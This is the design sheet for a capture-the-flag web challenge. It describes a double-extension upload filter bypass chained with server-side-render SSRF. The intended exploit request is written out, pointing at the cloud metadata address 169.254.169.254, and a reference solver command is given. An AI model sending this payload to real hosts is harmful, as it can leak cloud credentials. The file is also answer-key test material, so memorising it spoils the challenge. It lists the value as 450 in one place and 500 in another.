<!-- nctf-meta category="web" difficulty="medium" points="450" author="ctf-2026" stub="0" -->

# cms-uploadssrf

**Category** web · **Value** 500 · **Served** yes (per-team flag)

## Vulnerability chain

**Upload filter bypass → server-side render SSRF → metadata.** The upload only checks the declared filename ends in `.png` (bypass with a double extension), and the server-side renderer fetches any `render:<url>` — SSRF to the internal metadata host.

## Intended path

1. `POST /upload {filename:"exploit.svg.png", content:"render:http://169.254.169.254/latest/meta-data/flag"}`.
2. `rendered` is the per-team flag.

`/flag.txt` is served by no route; it only appears through the exploit above.

## Reference solver

```
python3 solution/solve.py http://HOST:PORT   # -> NCTF{…}
```

## Why it resists AI one-shotting

Per-team HMAC flag on the live instance, no downloadable artifact; the exploit
reads _this_ instance's secret at solve time, so a flag from another team is
useless.

## Verification status

Implemented. Verified end-to-end locally (Flask app + reference solver over
HTTP): the exploit path runs and the service returns the exact per-team flag.
**Docker/Lot-5 rehearsal is the remaining gate before `state: visible`.**
